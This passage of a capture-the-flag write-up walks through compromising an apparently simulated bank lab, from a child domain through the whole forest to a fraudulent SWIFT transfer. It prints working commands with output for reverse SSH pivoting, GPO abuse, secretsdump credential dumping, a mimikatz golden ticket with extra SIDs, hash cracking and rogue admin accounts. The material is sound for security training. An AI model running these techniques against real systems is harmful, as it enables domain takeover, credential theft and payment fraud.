PS C:\Users\mohammad.ahmed> ssh tunneluser@12.100.1.9 -R 9050 -N
The authenticity of host '12.100.1.9 (12.100.1.9)' can't be established.
ECDSA key fingerprint is SHA256:vy8coHY0geP5OZvyw+zTPNkk9edAkZVP6DZxa7hSuls.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '12.100.1.9' (ECDSA) to the list of known hosts.
tunneluser@12.100.1.9's password:
```
```bash
# On My Attacking Machine
$ netstat -lno | head -n 10               
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:9050                :::*                    LISTEN      off (0.00/0/0)

$ proxychains -q evil-winrm -i  10.200.89.32 -u svcScanning -p 'Password1!'

Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svcScanning\Documents> hostname
SERVER2
```
We are now able to obtain the following flags:

- ***Flag 5, Foothold on Corporate Division Tier 1 Infrastructure***

- ***Flag 6, Administrative access to Corporate Division Tier 1 Infrastructure***

# **Full Compromise of CORP Domain**
## **SERVER2 Machine**
### **Exploiting GPO GenericWrite**
Since we got access to SERVER1 and SERVER2, let’s execute the attack vector that was suggested by Bloodhound.
![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)

 As `SvcScanning`user has GenericWrite permission over the DC Backups group policy which is linked with the Domain Controllers group and the CORPDC Machine. Meaning, if we were able to exploit it, we will get access to the DC machine. Let’s first open MMC and add the group policy management snap in. then choose the DC Backup Policy and edit.
![Untitled](/assets/N-RedTeamCC/Untitled%2015.png)

Hmm! Unfortunately, I wasn’t able to edit the policy and wasn’t sure why; it took me lots of time to figure it out. It appears that I need to run MMC with a Local System account privilege, but I was running it with an administrator account. To do that, we could use `psexec64.exe` to run a cmd as a system account, then open the MMC.
```powershell
PS C:\Windows\Tasks> cp \\tsclient\share\psexec64.exe .
PS C:\Windows\Tasks> ls
    Directory: C:\Windows\Tasks

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2023   4:10 PM         833472 psexec64.exe

PS C:\Windows\Tasks> .\psexec64.exe -s -i cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> mmc
```
Editing the policy and adding our svcScanning user to the Domain Admins and Domain Controllers group via the Restricted Groups policy.
![Untitled](/assets/N-RedTeamCC/Untitled%2016.png)

Updating the GPO and checking our privileges.
```powershell
PS C:\Users\svcScanning> gpupdate.exe /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
PS C:\Users\svcScanning> net user svcScanning /domain
The request will be processed at a domain controller for domain corp.thereserve.loc.

User name                    svcScanning
Full Name                    svcScanning
Comment
Local Group Memberships
Global Group memberships     *Domain Controllers   *Domain Users
                             *Services             *Domain Admins
The command completed successfully.
```
Woo! Now we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We are now able to obtain the following flag:
***- Flag-7: Foothold on Corporate Division Tier 0 Infrastructure***
***- Flag-8: Administrative access to Corporate Division Tier 0 Infrastructure***

![Untitled](/assets/N-RedTeamCC/d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png)

# **Full Compromise of ROOTDC**
## **CORPDC Machine**
### **Enumeration**
Now we are part of the domain admins group and we own a child domain inside the whole forest. So let’s enumerate some information about the forest and the domain trust.

```powershell
# Forest: thereserve.loc
# ChildDomain1: bank.thereserve.loc
# ChildDomain2: corp.thereserve.loc -- OWNED

*Evil-WinRM* PS C:\Windows\Tasks> Get-ADForest
ApplicationPartitions : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=bank,DC=thereserve,DC=loc}
CrossForestReferences : {}
DomainNamingMaster    : ROOTDC.thereserve.loc
Domains               : {bank.thereserve.loc, corp.thereserve.loc, thereserve.loc}
ForestMode            : Windows2012R2Forest
GlobalCatalogs        : {ROOTDC.thereserve.loc, BANKDC.bank.thereserve.loc, CORPDC.corp.thereserve.loc}
Name                  : thereserve.loc
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=thereserve,DC=loc
RootDomain            : thereserve.loc
SchemaMaster          : ROOTDC.thereserve.loc
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}

# Using PowerView
*Evil-WinRM* PS C:\Windows\Tasks> Get-NetDomainTrust -Domain corp.thereserve.loc
SourceName          TargetName       TrustType TrustDirection
----------          ----------       --------- --------------
corp.thereserve.loc thereserve.loc ParentChild  Bidirectional

*Evil-WinRM* PS C:\Windows\Tasks> Get-NetDomainTrust -Domain bank.thereserve.loc
SourceName          TargetName       TrustType TrustDirection
----------          ----------       --------- --------------
bank.thereserve.loc thereserve.loc ParentChild  Bidirectional
```

**Parent Child Trust:** When new child domains are added, a two-way transitive trust is automatically established by Active Directory between the child domain and its parent.

**Transitive Trust:** A two-way relationship is automatically created between parent and child domains in a Microsoft Active Directory forest. When a new domain is created, it shares resources with its parent domain by default, enabling an authenticated user to access resources in both the child and parent domains.

**Bidirectional:** Users of both domains can access resources in the other domain.

Let’s simplify it with the following diagram:

![Untitled](/assets/N-RedTeamCC/trustissue.png)

As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain also, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.

### **Exploiting Transitive Trust**
A Golden Ticket attack is a way of creating a forged TGT with a stolen KDC key, which enables us to gain access to any service on the domain, essentially becoming our own Ticket Granting Server (TGS). In order to perform a Golden Ticket attack, we will need the following information:

- The Full Qualified Domain Name (FQDN) of the Domain
- The Security Identified (SID) of the Domain
- The username of the account that we want to impersonate
- The KRBTGT password hash

This allows us to forge Golden Tickets and access any resource in the CORP domain. However, we need to be able to forge an Inter-Realm TGT in order to become Enterprise Admins (EA) and access any resource in the ROOT domain. We need to exploit the trust between the parent domain and the child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket, allowing us to have Administrative privileges over the entire forest.
So, we also need the following information in order to craft our Golden Ticket:

- The SID of the child Domain Controller (CORPDC)
- The SID of the Enterprise Admins (EA) from the parent domain (ROOTDC)

```powershell
# Getting KRBTGT Hash 
$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.89.102
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::

# Getting CORP domain SID
PS C:\Windows\Tasks> Get-DomainSid
S-1-5-21-170228521-1485475711-3199862024

# Getting Enterprise Admins Group SID for ROOTDC domain 
PS C:\Windows\Tasks> Get-ADGroup -Identity 'Enterprise Admins' -Server ROOTDC.thereserve.loc
DistinguishedName : CN=Enterprise Admins,CN=Users,DC=thereserve,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : 6e883913-d0cb-478e-a1fd-f24d3d0e7d45
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-1255581842-1300659601-3764024703-519

# Creating the Golden Ticket
mimikatz : privilege::debug
Privilege '20' OK
mimikatz : kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
User      : Administrator
Domain    : corp.thereserve.loc (CORP)
SID       : S-1-5-21-170228521-1485475711-3199862024
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1255581842-1300659601-3764024703-519 ;
ServiceKey: 0c757a3445acb94a654554f3ac529ede - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 7/14/2024 4:18:13 PM ; 7/12/2034 4:18:13 PM ; 7/12/2034 4:18:13 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session

C:\Windows\system32>dir \\rootdc.thereserve.loc\c$
 Volume in drive \\rootdc.thereserve.loc\c$ has no label.
 Volume Serial Number is AE32-1DF2

 Directory of \\rootdc.thereserve.loc\c$

04/01/2023  04:10 AM               427 adusers_list.csv
03/17/2023  07:18 AM                85 dns_entries.csv
04/15/2023  08:52 PM         3,162,859 EC2-Windows-Launch.zip
11/14/2018  07:56 AM    <DIR>          EFI
04/15/2023  08:52 PM            13,182 install.ps1
05/13/2020  06:58 PM    <DIR>          PerfLogs
09/07/2022  04:58 PM    <DIR>          Program Files
09/07/2022  04:57 PM    <DIR>          Program Files (x86)
04/15/2023  08:51 PM             1,812 thm-network-setup-dc.ps1
07/14/2024  03:43 AM    <DIR>          Users
09/07/2022  07:39 PM    <DIR>          Windows
               5 File(s)      3,178,365 bytes
               6 Dir(s)  22,418,341,888 bytes free
```

### **Lateral Movement**
As our golden ticket is loaded into memory, and we have access to the ROOTDC machine, we need to perform lateral movement and establish a shell on this machine. A simple way would be by running psexec remotely on the ROOTDC machine.
```powershell
PS C:\Users\svcScanning\Desktop> .\psexec.exe \\ROOTDC.thereverse.loc cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access ROOTDC.thereverse.loc:
The network path was not found.
```
I am not sure why PSexec didn’t work so I tried to use the Wirnm protocol to connect remotely to the ROOTDC machine.
```powershell
PS C:\Users\svcScanning\Desktop> winrs -r:rootdc.thereserve.loc cmd.exe
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.CORP>whomai
whomai
'whomai' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator.CORP>whoami
whoami
corp\administrator

C:\Users\Administrator.CORP>hostname
hostname
ROOTDC
```
We are now able to obtain the following flags:
- ***Flag 15, Foothold on Parent Domain***

- ***Flag 16, Administrative access to Parent Domain***

# **Full Compromise of BANK Domain**
## **ROOTDC Machine**
### **Persistence**
Great, we have a fully interactive shell, let’s create our own user and add it to the enterprise admin group.
```powershell
C:\Users\Administrator.CORP>net user ItsFadinG "Password1!" /domain
The command completed successfully
C:\Users\Administrator.CORP>net group "Enterprise Admins" ItsFadinG /add /domain
The command completed successfully.

# Connecting from Attacking Machine
┌──(root㉿kali)-[~]
└─$ proxychains -q evil-winrm -i 10.200.89.100 -u ItsFadinG -p 'Password1!'                           

Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> hostname
ROOTDC
```

### **Port Forwarding**
We are now having access to the ROOTDC therefore, from here we can access the child domain BANK.thereverse.loc but we can’t access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the tryhackme VPN and the other for the Corp VPN, from that, we previously accessed the internal network.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC/proxychains]
└─$ ifconfig     
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet **10.50.87.39**  netmask 255.255.255.0  destination 10.50.87.39
        inet6 fe80::4eaf:39ba:b250:d638  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 1211  bytes 692035 (675.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1078  bytes 473631 (462.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet **12.100.1.8**  netmask 255.255.255.0  destination 12.100.1.8
        inet6 fe80::90f7:43f8:282d:b3f8  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 1548  bytes 457422 (446.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1405  bytes 263422 (257.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Let’s check which IP is reachable from the ROOTDC.
```powershell
# Corp VPN
*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> ping 12.100.1.8
Pinging 12.100.1.8 with 32 bytes of data:
Request timed out.

# Tryhackme VPN
*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> ping 10.50.87.39
Pinging 10.50.87.39 with 32 bytes of data:
Reply from 10.50.87.39: bytes=32 time=192ms TTL=63
Reply from 10.50.87.39: bytes=32 time=94ms TTL=63
```
So the tryhackme VPN is reachable there; let’s establish dynamic port forwarding to access the BANKDC machine.
```powershell
*Evil-WinRM* PS C:\Users\ItsFadinG\Documents> ssh tunneluser@10.50.87.39 -R 9060 -N
tunneluser@10.50.87.39's password:
```
Let’s RDP to it and check.
```bash
┌──(root㉿kali)-[/]
└─$ proxychains -q -f proxychains4.conf xfreerdp /u:ItsFadinG /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.101            
[13:26:48:054] [902989:902999] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: **STATUS_LOGON_FAILURE** [0xC000006D] from server
[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[13:26:48:054] [902989:902999] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
```
Hmm! It is not working, but the error is indicating that the credentials are wrong, which means there is a connectivity between them. So let’s RDP from ROOTDC to BANKDC and rest our password or change the password for the administrator user, then try to connect again.
```powershell
# From Administrative powershell
PS C:\Windows\system32> hostname
BANKDC
PS C:\Windows\system32> net user Administrator "Password1!" /domain
The command completed successfully.
```
Connecting again with the administrator user:
```bash
# The Reason for specfing proxychains files as I am using two proxies
# the first is tunneling traffic from the WKR1 or WRK2 to my attacking machine giving me direct access to the SERVERs and DC
# The other one from the ROOTDC to my attacking machine giving me direct access to the bank.thereveres.loc child domain
┌──(root㉿kali)-[/tmp/aaa]
└─$ proxychains -q -f proxychains4.conf xfreerdp /u:Administrator /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.101  
```
![Untitled](/assets/N-RedTeamCC/Untitled%2018.png)

Since we have an administrator account then all child domains are owned now and their flags can be submitted.
- ***Flag 9, Foothold on Bank Division Tier 2 Infrastructure***

- ***Flag 10, Administrative access to Bank Division Tier 2 Infrastructure***

- ***Flag 11, Foothold on Bank Division Tier 1 Infrastructure***

- ***Flag 12, Administrative access to Bank Division Tier 1 Infrastructure***

- ***Flag 13, Foothold on Bank Division Tier 0 Infrastructure***

- ***Flag 14, Administrative access to Bank Division Tier 0 Infrastructure***
![Untitled](/assets/N-RedTeamCC/Untitled%2019.png)

# **Compromise of SWIFT and Payment Transfer**
## **BANKDC Machine**
### **Enumeration**
Let’s create our own user and enumerate the groups:
```powershell
PS C:\Users\Administrator> net user ItsFadinG "adeladel22!" /domain /add
The command completed successfully.
PS C:\Users\Administrator> net group

Group Accounts for \\BANKDC
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Group Policy Creator Owners
*Key Admins
*Payment Approvers
*Payment Capturers
*Protected Users
*Read-only Domain Controllers
*Tier 0 Admins
*Tier 1 Admins
*Tier 2 Admins
The command completed successfully.
```
Those two groups seems to be interesting; let’s add our user to them.
```powershell
PS C:\Users\Administrator> net group "Domain Admins" /add ItsFadinG /domain
The command completed successfully.

PS C:\Users\Administrator> net group "Payment Approvers" /add ItsFadinG /domain
The command completed successfully.

PS C:\Users\Administrator> net group "Payment Capturers" /add ItsFadinG /domain
The command completed successfully.
```
Now that we have owned all the machines, let’s review our Project Goal:
```txt
the government of Trimento has shared some information about the SWIFT backend system. SWIFT runs in an isolated secure environment with restricted access. While the word impossible should not be used lightly, the likelihood of the compromise of the actual hosting infrastructure is so slim that it is fair to say that it is impossible to compromise this infrastructure. However, the SWIFT backend exposes an internal web application at [http://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/,) which TheReserve uses to facilitate transfers. The government has provided a general process for transfers. To transfer funds: 
1. A customer makes a request that funds should be transferred and receives a transfer code.
2. The customer contacts the bank and provides this transfer code.
3. An employee with the capturer role authenticates to the SWIFT application and *captures* the transfer.
4. An employee with the approver role reviews the transfer details and, if verified, *approves* the transfer. This has to be performed from a jump host.
5. Once approval for the transfer is received by the SWIFT network, the transfer is facilitated and the customer is notified. Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.
```
So what we need is to access the SWIFT web application, perform a transaction and have the ability to capture it and approve it. As the diagram of this network suggests, the SWIFT machine can be accessed only from the JMP machine.

## **JMP Machine**
### **Enumeration**
```bash
$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:ItsFadinG /p:'adeladel22!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.61
[13:43:25:568] [1073491:1073501] [ERROR][com.winpr.timezone] - Unable to get current timezone rule
[13:43:25:082] [1073491:1073501] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:43:25:082] [1073491:1073501] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:43:25:174] [1073491:1073501] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:43:25:175] [1073491:1073501] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:43:25:175] [1073491:1073501] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[13:43:27:367] [1073491:1073501] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```
```bash
PS C:\Users\ItsFadinG> hostname
JMP
```
Let’s access the SWIFT web application:
![Untitled](/assets/N-RedTeamCC/Untitled%2020.png)

### **Dynamic Port Forwarding**
For better application inspection with Burp Suite, we could use Dynamic port forwarding to access this Swift web app from our attacking machine.
```bash
PS C:\Users\ItsFadinG> ssh tunneluser@10.50.87.39 -R 9070 -N
The authenticity of host '10.50.87.39 (10.50.87.39)' can't be established.
ECDSA key fingerprint is SHA256:vy8coHY0geP5OZvyw+zTPNkk9edAkZVP6DZxa7hSuls.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.50.87.39' (ECDSA) to the list of known hosts.
tunneluser@10.50.87.39's password:
```

### **Access to SWIFT application**
Now we can gain flag 17 ***"Access to SWIFT application"  let’s see the instructions***
```bash
In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
===============================================
Account Details:
Source Email:           ItsFadinG@source.loc
Source Password:        tC1mulotC2R9ww
Source AccountID:       66966098984e4a2c8cd94573
Source Funds:           $ 10 000 000

Destination Email:      ItsFadinG@destination.loc
Destination Password:   w4jd6RaQNCtfKw
Destination AccountID:  6696609a984e4a2c8cd94574
Destination Funds:      $ 10
===============================================

Using these details, perform the following steps:
1. Go to the SWIFT web application
2. Navigate to the Make a Transaction page
3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
4. Issue the transfer for the full 10 million dollars
5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
```
![Untitled](/assets/N-RedTeamCC/Untitled%2021.png)

We received a PIN in our email and using it we can confirm that our transaction was initiated.
![Untitled](/assets/N-RedTeamCC/Untitled%2022.png)

We have received flag 17, but after that we have received an important email:
![Untitled](/assets/N-RedTeamCC/Untitled%2023.png)

As stated, we need to have a capturer and approver account to be able to create our own transfer from start to finish and show impact.

### **SWIFT Capturer and Capturer Access**
If you remember from our previous enumeration, we have found two interesting groups and added our users to them **( Payment Approvers - Payment Capturers ).** Let’s try to log in to the application using our domain username:
![Untitled](/assets/N-RedTeamCC/Untitled%2024.png)

Unfortunately, it didn’t work. Let’s check the other user, then change his password and try to login again.
```powershell
PS C:\Users\ItsFadinG> net group "Payment Capturers" /domain
The request will be processed at a domain controller for domain bank.thereserve.loc.

Group name     Payment Capturers

Members
-------------------------------------------------------------------------------
a.barker                 c.young                  g.watson
ItsFadinG                s.harding                t.buckley

PS C:\Users\ItsFadinG> net group "Payment Approvers" /domain
The request will be processed at a domain controller for domain bank.thereserve.loc.

Group name     Payment Approvers
Comment

Members

-------------------------------------------------------------------------------
a.holt                   a.turner                 ItsFadinG
r.davies                 s.kemp

PS C:\Users\ItsFadinG> net user g.watson "adeladel22!" /domain
The request will be processed at a domain controller for domain bank.thereserve.loc.

The command completed successfully.
```
But it didn’t work also:
![Untitled](/assets/N-RedTeamCC/Untitled%2025.png)

Hmm! This suggests that some users may be using different credentials for the SWIFT web app other than their active directory password. But other users may use the same password for both. So let’s try to dump all users’ passwords and crack them.
```bash
# Filtering for users that are only part of the Payment Approvers and Payment Capturers groups
┌──(root㉿kali)-[~/THM/N-RedTeamCC]
└─$ proxychains -f proxychains/proxychains_ROOTDC_To_BANKDC.conf -q impacket-secretsdump bank.thereserve.loc/ItsFadinG:'adeladel22!'@10.200.89.101
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
c.young:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
a.holt:1155:aad3b435b51404eeaad3b435b51404ee:d1b47b43b82460e3383d974366233ddc:::
a.turner:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
a.barker:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
s.harding:1198:aad3b435b51404eeaad3b435b51404ee:9e4a079d9c28c961d38bd2cca0c9cd5d:::
t.buckley:1273:aad3b435b51404eeaad3b435b51404ee:b8761a00e67b0023797eb3c988c86995:::
s.kemp:1321:aad3b435b51404eeaad3b435b51404ee:b2dd1c3f51cfb425db0a23090c58fe2e:::
r.davies:1221:aad3b435b51404eeaad3b435b51404ee:90a12d9dab5cd7b826964e169488d8e9:::
```
Let’s try to crack them
```bash
hashcat -m 1000 -a 0 Hashes/PaymnetsGroupsUsers.hash /usr/share/wordlists/rockyou.txt --show
fbdcd5041c96ddbd82224270b57f11fc:Password!
```
Only one NTLM hash has been cracked, but luckily, three users are using the same password:
```bash
**a.turner**:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
**a.barker**:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
**c.young**:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
```
let’s try to access the SWIFT web app with these creds only the **c.young** user worked as a Capturer user:
![Untitled](/assets/N-RedTeamCC/3a9feb96-870a-4110-8b2f-2e2477fa7e49.png)
![Untitled](/assets/N-RedTeamCC/Untitled%2026.png)

Now we can submit:
- ***Flag-18: Access to SWIFT application as capturer***
```bash
In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created for you.

Please look for a transaction with these details:

FROM:   631f60a3311625c0d29f5b32
TO:     66a23d8e984e4a04f6a2e06d

Look for this transfer and capture (forward) the transaction.
```
![Untitled](/assets/N-RedTeamCC/Untitled%2027.png)

Click forward, and we have received our flag! Now we need to get access to an Approver account. Since we have cracked three accounts, one of which is only part of the Payment Approvers group, let’s connect to the JMP machine using a.turner user.
```bash
┌──(root㉿kali)-[~/THM/N-RedTeamCC\proxychains]
└─$ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:a.turner /p:'Password!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.61
[15:07:47:271] [1114772:1114790] [ERROR][com.winpr.timezone] - Unable to get current timezone rule
[15:07:47:885] [1114772:1114790] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[15:07:47:885] [1114772:1114790] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[15:07:47:094] [1114772:1114790] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[15:07:47:095] [1114772:1114790] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[15:07:47:095] [1114772:1114790] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[15:07:49:623] [1114772:1114790] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
```
Surprise! It seems that Alison Turner has a bad memory, he has saved his password and has an open session on the JMP machine.
![Untitled](/assets/N-RedTeamCC/Untitled%2028.png)

let’s submit ***Flag-19: Access to SWIFT application as approver***
```bash
In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.

Please look for a transaction with these details:

FROM:   631f60a3311625c0d29f5b31
TO:     66a23d8e984e4a04f6a2e06d

Look for this transfer and approve (forward) the transaction.
```
![Untitled](/assets/N-RedTeamCC/Untitled%2029.png)

### **SWIFT Simulated Fraudulent Transfer**
We are one step away from our final goal and the last flag, ***Flag-20: Simulated fraudulent transfer made***.
```bash
This is the final check! Please do not attempt this if you haven't completed all of the other flags.
Once done, follow these steps:
1. Using your DESTINATION credentials, authenticate to SWIFT
2. Using the PIN provided in the SWIFT access flag email, verify the transaction.
3. Using your capturer access, capture the verified transaction.
4. Using your approver access, approve the captured transaction.
5. Profit?
```
**Verifying The Transaction**
from `ItsFadinG@destination.loc` email
![Untitled](/assets/N-RedTeamCC/Untitled%2030.png)

**Capture the Verified Transaction**
from  `c.young@bank.thereserve.loc` email:
![Untitled](/assets/N-RedTeamCC/Untitled%2031.png)

**Approve The Captured Transaction**
from the `a.turner@bank.thereserve.loc` email:
![Untitled](/assets/N-RedTeamCC/Untitled%2032.png)

Let’s check the status of our transaction:
![Untitled](/assets/N-RedTeamCC/Untitled%2033.png)

And We Hacked the Bank!!
![Untitled](/assets/N-RedTeamCC/Untitled%2034.png)
![Untitled](/assets/N-RedTeamCC/Untitled%2035.png)

# **Summary**
As Pivoting is a crucial step in any red team engagements, and it is a bit hard to follow. I decided to create a summary of my port forwarding methodology, which exclusively utilized Dynamic SSH Port Forwarding. This approach enabled secure, flexible access to internal network resources, playing a pivotal role in my overall strategy.
![Untitled](/assets/N-RedTeamCC/PF-Summary.png)

# **Conclusion**
Completing the RedTeam Capstone Challenge was a journey that took me over two months, balanced alongside my military service. By sharing not only the direct solutions but also my failed attempts, I aimed to provide a more immersive experience. I hope you enjoyed it. Thank you for following along with my writeup. I welcome any feedback you may have. Until next time, Peace!!